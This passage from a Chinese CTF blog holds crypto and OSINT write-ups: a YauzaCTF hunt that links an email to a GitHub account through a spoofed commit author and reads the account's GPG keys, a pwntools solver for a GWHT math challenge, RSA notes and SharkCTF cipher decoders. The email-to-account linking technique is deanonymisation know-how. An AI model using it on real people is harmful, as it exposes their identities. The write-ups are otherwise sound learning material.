<span class="title">which_playlist_i_want_to_listen</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> currenthour = <span class="keyword">new</span> <span class="built_in">Date</span>().getHours(); </span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">switch</span>(currenthour % <span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">case</span> <span class="number">0</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&quot;player1&quot;</span>);</span></span><br><span class="line"><span class="javascript">            elem.removeAttribute(<span class="string">&quot;hidden&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">case</span> <span class="number">1</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&quot;player2&quot;</span>);</span></span><br><span class="line"><span class="javascript">            elem.removeAttribute(<span class="string">&quot;hidden&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">case</span> <span class="number">2</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&quot;player3&quot;</span>);</span></span><br><span class="line"><span class="javascript">            elem.removeAttribute(<span class="string">&quot;hidden&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">which_playlist_i_want_to_listen();</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>挺怪的，战斗民族喜欢看这些？宇航器挺帅的，Our Dream听着挺空灵的，我当bgm了</p>
<p><a href="https://chrome.google.com/webstore/detail/ycs-youtube-comment-searc/pmfhcilikeembgbiadjiojgfgcfbcoaa?hl=zh-CN">YCS插件</a>可以对YouTube的评论进行筛选，点save可以下载，可以用脚本去正则匹配你所想要的</p>
<p>但这位师傅上述操作无果，竟然想到在github上搜<code>which_playlist_i_want_to_listen</code>这个源代码里的函数名，而且确实有；<strong>注意，不是在搜索引擎里搜，而是在github内搜</strong>，学到了</p>
<p>是一模一样的源码<a href="https://github.com/znak-kachestva/sovietwave-player/blob/main/index.html">https://github.com/znak-kachestva/sovietwave-player/blob/main/index.html</a></p>
<p>而且可以看出主人的账号是在前不久刚创建的，与比赛的时间吻合，<code>CCCP</code>就是苏联，尝试搜索这位<code>znak-kachestva</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905212654561.png" alt="image-20210905212654561"></p>
<p>通过将用户名替换该网址的<github-username>可以搜索该用户在库中的一些操作</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://api.github.com/users/<span class="tag">&lt;<span class="name">github-username</span>&gt;</span>/events/public</span><br></pre></td></tr></table></figure>

<p>像这样，师傅说想拿来作为找邮箱的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905214749725.png" alt="image-20210905214749725"></p>
<p>然后显然这里并没有邮箱，因为github默认设置了隐私</p>
<p>然后这位师傅就很CTFer得想到第一题的邮箱可不可以拿来用</p>
<p>这里师傅演示了怎么用电子邮件发现GitHub帐户，这是他罗列的步奏</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905215434834.png" alt="image-20210905215434834"></p>
<p>我跟着操作了下，最近也在玩github，学点</p>
<p>在自己的github上创建一个库，名字随便取，文件随便加，复制这个的链接</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905232014165.png" alt="image-20210905232014165"></p>
<p>然后打开<code>Git Bash</code>，然后在cd到你合适的目录，clone下来刚才创立的远程库，随便加一个文件，我这里把Crypto题的一个脚本复制过去了，然后输入<code>git add *</code>添加文件，依照如下代码设置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;bar&quot; --author=&quot;foo &lt;tovarishch123@protonmail.com&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>最后输入<code>git push origin main</code>给push过去就好，如果push过程有问题可以参考<a href="https://www.cnblogs.com/steamed-twisted-roll/p/14155092.html">这篇博客</a></p>
<p>完成后可以看到，刚才头像的那个人竟然和我在共同编写这个库</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905233507116.png" alt="image-20210905233507116"></p>
<p>在<a href="https://github.com/4XWi11/email-guess/commit/a3bb75e9327f0728f0c25b81bb886aa6664b0383.patch">commit hash的.patch</a>里面可以看到，确实是该邮箱与那个github的账号相关联</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905235538286.png" alt="image-20210905235538286"></p>
<p>最后说可以从API访问而不是使用电子邮件访问的GitHub SSH、PGP和GPG密钥</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906000317896.png" alt="image-20210906000317896"></p>
<p>是在最后一个这里<a href="https://api.github.com/users/znak-kachestva/gpg_keys">https://api.github.com/users/znak-kachestva/gpg_keys</a>找到的</p>
<p>还有一个假的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906101101627.png" alt="image-20210906101101627"></p>
<p>也可以直接访问这个网址直接获得干净的公钥<a href="https://github.com/znak-kachestva.gpg">https://github.com/znak-kachestva.gpg</a></p>
<p>最后根据题目意思，提交公钥的前42位就好了</p>
<p><code>YauzaCTF&#123;xo0EYSVYlQEEANaoJXa6DarxrVc8OWpexZxAq0z8a7&#125;</code></p>
<p>确实，正如师傅所说，OSINT方向对学习github的使用也很有帮助</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>CopperSmith</tag>
        <tag>OSINT</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>20210911 GWHTCrypto方向部分WP</title>
    <url>/posts/b13b0850/</url>
    <content><![CDATA[<p>广外女生战队出的题，没什么大战队，都在RCTF那边</p>
<p>密码怎么说，换成OSINT更好？</p>
<span id="more"></span>

<h1 id="羊城杯"><a href="#羊城杯" class="headerlink" title="羊城杯"></a>羊城杯</h1><h2 id="RingRingRing"><a href="#RingRingRing" class="headerlink" title="RingRingRing"></a>RingRingRing</h2><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210911162154426.png" alt="image-20210911162154426"></p>
<p>题目意思很简单，要找出100组$a^4+b^4+c^4+d^4=e^2$的解，并且有一定的限制，比如不能有0，完全相同的解不能重复，但是允许交换顺序</p>
<p>但条件相对虎符的那一道题已经相当宽泛了，有空去研究下那道<a href="https://lazzzaro.github.io/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/index.html">cubic</a></p>
<p>此外，这个等式的解也并不是像<a href="https://zhuanlan.zhihu.com/p/33853851">史上最贱的数学题</a>那样难找，还是挺多的，稍微控制了下循环的参数，再加上可以排列组合，直接brute-force了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># nc 192.168.39.3 2378</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product, permutations</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> hexdigits</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">space = hexdigits[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;192.168.39.3&#x27;</span>, <span class="number">2378</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    <span class="comment"># Please find a string that md5(str + 848e)[0:5] == c04dd</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = proof[<span class="number">36</span>:<span class="number">40</span>].decode()</span><br><span class="line">    HASH5 = proof[<span class="number">50</span>:<span class="number">55</span>].decode()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">6</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = md5((head+tail).encode()).hexdigest()[<span class="number">0</span>:<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> t == HASH5:</span><br><span class="line">            sh.recvuntil(<span class="string">b&#x27;[&gt;] Give me xxxxx: &#x27;</span>)</span><br><span class="line">            sh.sendline(head.encode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work2</span>():</span></span><br><span class="line">    <span class="comment"># Please find a string that md5(str + 848e)[0:5] == c04dd</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = <span class="string">&#x27;cdc3&#x27;</span></span><br><span class="line">    HASH5 = <span class="string">&#x27;ae696&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">6</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = md5((head+tail).encode()).hexdigest()[<span class="number">0</span>:<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> t == HASH5:</span><br><span class="line">            <span class="built_in">print</span>(head)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m, n = [], []</span><br><span class="line"><span class="keyword">for</span> n1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> n2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">for</span> n3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">            <span class="keyword">for</span> n4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">                <span class="keyword">if</span> iroot(n1**<span class="number">4</span>+n2**<span class="number">4</span>+n3**<span class="number">4</span>+n4**<span class="number">4</span>, <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">                    n.append([n1, n2, n3, n4])</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(n) == <span class="number">14</span>:</span><br><span class="line">                        <span class="comment"># permutations</span></span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">                            <span class="keyword">for</span> j <span class="keyword">in</span> permutations(i, <span class="number">4</span>):</span><br><span class="line">                                <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> m:</span><br><span class="line">                                    m.append(j)</span><br><span class="line">                        <span class="keyword">assert</span> <span class="built_in">len</span>(m) &gt;= <span class="number">100</span></span><br><span class="line">                        m = m[:<span class="number">100</span>]</span><br><span class="line">                        proof_of_work()</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">                            sh.recvuntil(<span class="string">b&#x27;[&gt;] a:&#x27;</span>)</span><br><span class="line">                            sh.sendline(<span class="built_in">str</span>(i[<span class="number">0</span>]).encode())</span><br><span class="line">                            sh.recvuntil(<span class="string">b&#x27;[&gt;] b:&#x27;</span>)</span><br><span class="line">                            sh.sendline(<span class="built_in">str</span>(i[<span class="number">1</span>]).encode())</span><br><span class="line">                            sh.recvuntil(<span class="string">b&#x27;[&gt;] c:&#x27;</span>)</span><br><span class="line">                            sh.sendline(<span class="built_in">str</span>(i[<span class="number">2</span>]).encode())</span><br><span class="line">                            sh.recvuntil(<span class="string">b&#x27;[&gt;] d:&#x27;</span>)</span><br><span class="line">                            sh.sendline(<span class="built_in">str</span>(i[<span class="number">3</span>]).encode())</span><br><span class="line">                            sh.recvuntil(<span class="string">b&#x27;[&gt;] e:&#x27;</span>)</span><br><span class="line">                            sh.sendline(<span class="built_in">str</span>(iroot(i[<span class="number">0</span>]**<span class="number">4</span>+i[<span class="number">1</span>]**<span class="number">4</span>+i[<span class="number">2</span>]**<span class="number">4</span>+i[<span class="number">3</span>]**<span class="number">4</span>, <span class="number">2</span>)[<span class="number">0</span>]).encode())</span><br><span class="line">                            sh.recvline()</span><br><span class="line">                        flag = sh.recvline()</span><br><span class="line">                        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>脚本写的还是挺丑</p>
<h2 id="Bigrsa"><a href="#Bigrsa" class="headerlink" title="Bigrsa"></a>Bigrsa</h2><p>给了两个n，隐晦地表达模数之间有公因子，分解下，来两次传统手艺就好，没什么说的</p>
<h2 id="MISS（osint）"><a href="#MISS（osint）" class="headerlink" title="MISS（osint）"></a>MISS（osint）</h2><p>emmmm有点拉垮，github上找到原题，exp都不用改<br><a href="https://github.com/Mathsyo/CTFs/tree/2630cdb64799774020d32107ff0ebcf269c64535/MidnightFlagCTF/Cryptography/Something_missing">https://github.com/Mathsyo/CTFs/tree/2630cdb64799774020d32107ff0ebcf269c64535/MidnightFlagCTF/Cryptography/Something_missing</a></p>
<p>自从上次YauzaCTF跟着OSINT师傅玩了下，发现github真的是好东西</p>
<p>比赛结束研究下考点</p>
<h2 id="Rsa-（unsolved）"><a href="#Rsa-（unsolved）" class="headerlink" title="Rsa?（unsolved）"></a>Rsa?（unsolved）</h2><p>库鲁西，十几个人解出来了</p>
<p>关键信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xy = <span class="keyword">lambda</span> (x1,y1),(x2,y2): ((x1*x2+D*y1*y2)%n, (x1*y2+x2*y1)%n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getloop</span>(<span class="params">(<span class="params">x,y</span>), e</span>):</span></span><br><span class="line">	ret = (x, y)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e-<span class="number">1</span>):</span><br><span class="line">		ret = xy(ret, (x,y))</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line"><span class="built_in">print</span> getloop((X, Y), e)</span><br></pre></td></tr></table></figure>

<p>$Z_1\equiv_n M_x*M_y$<br>$X\equiv_n (Z_1+Z_1^{-1})\times 2^{-1}$<br>$a\equiv_n(Z1^{-1}-X)*Y^{-1}$<br>$D\equiv_n a^2$</p>
<p>只知道a和n，然后getloop迭代了65536次的（X，Y），Y就是My</p>
<p>显然只要知道Z1，就能全部推导出来</p>
<p>然后<code>getloop</code>这个函数里面，很像杨辉三角里的东西，但循环结束算出的$x+y$和$(X+aY)^{65537}\ mod\ n$直接还是有区别</p>
<p>不过进一步推导下，$X+aY=X+Z_1^{-1}-X=Z_1^{-1}$，后面可能就是求得对$(Z_1^{-1})^{65537}\ mod\ n$进行的加密，但是n分解不了，库鲁西</p>
<p>记录几组坐标</p>
<ol start="0">
<li><p>$(x,\ y)$</p>
</li>
<li><p>$(x^2+Dy^2,\ 2xy)$</p>
</li>
<li><p>$(x^3+3Dy^2x,\ 3x^2y+Dy^3)$</p>
</li>
<li><p>$(x^4+6Dx^2y^2+D^2y^4,\  4x^3y+4Dy^3x)$</p>
</li>
<li><p>$(x^5+10Dx^3y^2+5D^2y^4x,\ 5x^4y+10Dy^3x^2+D^2y^5)$</p>
</li>
<li><p>$(x^6+15Dx^4y^2+15Dy^4x^2+D^3y^6,\ 6x^5y+20Dx^3y^3+6D^2y^5x)$</p>
<p> $\vdots$</p>
</li>
</ol>
<p>0x10001. $(x^{65537}+\cdots,\ \cdots +D^{32768}y^{65537})$</p>
<p>变成x+y呢<br>$$<br>x+y\notag<br>$$<br>$$<br>x^2+2xy+Dy^2\notag<br>$$<br>$$<br>x^3+3x^2y+3Dy^2x+Dy^3\notag<br>$$<br>$$<br>x^4+4x^3y+6Dx^2y^2+4Dy^3x+D^2y^4\notag<br>$$<br>$$<br>x^6+6x^5y+15Dx^4y^2+20Dx^3y^3+15Dy^4x^2\notag+6D^2y^5x+D^3y^6<br>$$<br>$$<br>\vdots\notag<br>$$<br>简化成杨辉三角的模式<br>$$<br>1\notag<br>$$<br>$$<br>1\ 1\notag<br>$$<br>$$<br>1\ 2\ D\notag<br>$$<br>$$<br>1\ 3\ 3D\ D\notag<br>$$<br>$$<br>1\ 4\ 6D\ 4D\ D^2\notag<br>$$<br>$$<br>1\ 6\ 15D\ 20D\ 15D\ 6D^2\ D^3\notag<br>$$<br>$$<br>\vdots\notag<br>$$<br>似乎有什么规律，D用a来代呢</p>
<ol>
<li><p>$(x,\ y)$</p>
</li>
<li><p>$(x^2+a^2y^2,\ 2xy)$</p>
</li>
<li><p>$(x^3+3a^2y^2x,\ 3x^2y+a^2y^3)$</p>
</li>
<li><p>$(x^4+6a^2x^2y^2+a^4y^4,\  4x^3y+4a^2y^3x)$</p>
</li>
<li><p>$(x^5+10a^2x^3y^2+5a^4y^4x,\ 5x^4y+10a^2y^3x^2+a^4y^5)$</p>
</li>
<li><p>$(x^6+15a^2x^4y^2+15a^2y^4x^2+a^6y^6,\ 6x^5y+20a^2x^3y^3+6a^4y^5x)$</p>
<p>$\vdots$</p>
</li>
</ol>
<p>$$<br>x+y\notag<br>$$<br>$$<br>x^2+2xy+a^2y^2\notag<br>$$<br>$$<br>x^3+3x^2y+3a^2y^2x+a^2y^3\notag<br>$$<br>$$<br>x^4+4x^3y+6a^2x^2y^2+4a^2y^3x+a^4y^4\notag<br>$$<br>$$<br>x^6+6x^5y+15a^2x^4y^2+20a^2x^3y^3+15a^2y^4x^2+6a^4y^5x+a^6y^6\notag<br>$$<br>$$<br>\vdots\notag<br>$$</p>
<p>$$<br>(x+ay)^1-(a-1)y\notag<br>$$<br>$$<br>(x+ay)^2-2(a-1)xy\notag<br>$$<br>$$<br>(x+ay)^3-(a^2-1)y^3-(3a^3-1)y^2x\notag<br>$$</p>
<p>越搞越乱，如果flag是和<code>flag = &quot;GWHT&#123;xxxxxxxxx&#125;&quot;</code>所说的一样长，那么Y是要比X小很多的</p>
<p>有师傅解出来了，转换成分数的形式我不知道严不严谨，后面还是主要能找到规律吧<br><a href="https://blog.csdn.net/qq_36489548/article/details/120262846">https://blog.csdn.net/qq_36489548/article/details/120262846</a></p>
<h2 id="Easy-Rsa（osint）"><a href="#Easy-Rsa（osint）" class="headerlink" title="Easy_Rsa（osint）"></a>Easy_Rsa（osint）</h2><p>来看生成p和q的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gamma = 0.48</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    <span class="comment"># 491</span></span><br><span class="line">    g = getPrime(<span class="built_in">int</span>(nbits * gamma))</span><br><span class="line">    <span class="comment"># 0.02</span></span><br><span class="line">    alpha = <span class="number">0.5</span> - gamma</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 20</span></span><br><span class="line">        a = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">        p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">            q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            h = <span class="number">2</span> * g * a * b + a + b</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> isPrime(h) <span class="keyword">or</span> gmpy2.gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">                q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> p, q</span><br></pre></td></tr></table></figure>

<p>又是原题，直接打，<a href="https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/">https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/</a>，la佬的博客都借鉴这位师傅的</p>
<p>不过确实挺好奇是怎么出的，照例原题赛后复现，因为完全可以赛前就做到，没必要比赛时研究</p>
<h2 id="Think-about-it（unsolved）"><a href="#Think-about-it（unsolved）" class="headerlink" title="Think about it（unsolved）"></a>Think about it（unsolved）</h2><p>一道逆向题，可以看出其中包含了SM4，但是伪代码还是看不懂</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉没怎么动脑子，总共六道密码题，两道水题，两道原题，一道没想通，一道看不懂伪代码</p>
<p>还是做得不愉快啊</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>RSA LSB</tag>
      </tags>
  </entry>
  <entry>
    <title>20210917 SharkCTFCrypto方向部分WP</title>
    <url>/posts/69ac5a99/</url>
    <content><![CDATA[<p>W&amp;M密码师傅亲自出题</p>
<p>比赛应该结束了吧，有新题但是没来得及看</p>
<span id="more"></span>

<h1 id="SharkCTF"><a href="#SharkCTF" class="headerlink" title="SharkCTF"></a>SharkCTF</h1><h2 id="Cryptography指北"><a href="#Cryptography指北" class="headerlink" title="Cryptography指北"></a>Cryptography指北</h2><p>给了pdf，一个对CTF-Crypto方向的介绍以及一些经验之谈，看到wishper师傅博客上的话</p>
<h2 id="Classic-Crypto-king"><a href="#Classic-Crypto-king" class="headerlink" title="Classic_Crypto_king"></a>Classic_Crypto_king</h2><blockquote>
<p>FunexPGS{pn3F4e!_PN3fnE1_PnrFne!}</p>
</blockquote>
<h2 id="Classic-Crypto-king2"><a href="#Classic-Crypto-king2" class="headerlink" title="Classic_Crypto_king2"></a>Classic_Crypto_king2</h2><p>base92的乱序版？table和key一一对应，怎么来怎么回去</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~#$%&amp;()&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;Y:AHor7yd%`vn|i4q1NzapTG3/^5WbL6wE?.Q&lt;Mcse#Bgjhlf8O&#125;_*&#123;m;J=RFC-(9])ZXD,&amp;&gt;kI$@~[SK02x!u+VtU\P&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;&#123;1`5aMme2OGHKnB`5onbH*KQ44`:5KbOK`83m1i5Kn1o*`Mbi5-!&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    flag += table[key.index(i)]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="The-nature-of-the-human"><a href="#The-nature-of-the-human" class="headerlink" title="The_nature_of_the_human"></a>The_nature_of_the_human</h2><p>有两个可以反向爆破，另外一个拿自动解base的函数改一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"></span><br><span class="line">ls = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    ls.append(sha256(i.encode()).hexdigest())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> printable[ls.index(x)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="number">114514</span>, <span class="built_in">ord</span>(x), <span class="number">1919810</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lx = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    lx.append(fun2(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun3</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = b16decode(x)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = b64decode(x)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = b32decode(x)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">cipher = [<span class="number">617074</span>, <span class="string">&#x27;aaa9402664f1a41f40ebbc52c9993eb66aeb366602958fdfaa283b71e64db123&#x27;</span>, <span class="number">1452754</span>, <span class="string">&#x27;454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1&#x27;</span>, <span class="string">b&#x27;6B&#x27;</span>, <span class="string">b&#x27;53553039505430395054303D&#x27;</span>, <span class="number">1165366</span>, <span class="string">&#x27;f67ab10ad4e4c53121b6a5fe4da9c10ddee905b978d3788d2723d7bfacbe28a9&#x27;</span>, <span class="string">b&#x27;UE09PT09PT0=&#x27;</span>, <span class="string">&#x27;1b16b1df538ba12dc3f97edbb85caa7050d46c148134290feba80f8236c83db9&#x27;</span>, <span class="string">&#x27;5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9&#x27;</span>, <span class="string">&#x27;d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde&#x27;</span>, <span class="string">&#x27;454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1&#x27;</span>, <span class="number">652094</span>, <span class="number">738306</span>, <span class="string">b&#x27;ZQ==&#x27;</span>, <span class="string">b&#x27;55673D3D&#x27;</span>, <span class="string">&#x27;043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89&#x27;</span>, <span class="string">b&#x27;54565539505430395054303D&#x27;</span>, <span class="string">&#x27;d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde&#x27;</span>, <span class="string">b&#x27;Yg==&#x27;</span>, <span class="number">889404</span>, <span class="string">b&#x27;4F513D3D3D3D3D3D&#x27;</span>, <span class="number">1242964</span>, <span class="string">&#x27;454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1&#x27;</span>, <span class="string">b&#x27;MU======&#x27;</span>, <span class="string">b&#x27;UA==&#x27;</span>, <span class="string">b&#x27;R009PT09PT0=&#x27;</span>, <span class="number">962556</span>, <span class="string">&#x27;e632b7095b0bf32c260fa4c539e9fd7b852d0de454e9be26f24d0d6f91d069d3&#x27;</span>, <span class="string">b&#x27;54445139505430395054303D&#x27;</span>, <span class="string">&#x27;a1fce4363854ff888cff4b8e7875d600c2682390412a8cf79b37d0b11148b0fa&#x27;</span>, <span class="string">&#x27;a9f51566bd6705f7ea6ad54bb9deb449f795582d6529a0e22207b8981233ec58&#x27;</span>, <span class="number">1443444</span>, <span class="string">&#x27;d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(i, <span class="built_in">int</span>):</span><br><span class="line">        flag += printable[lx.index(i)]</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(i, <span class="built_in">str</span>):</span><br><span class="line">        flag += fun1(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += fun3(i).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

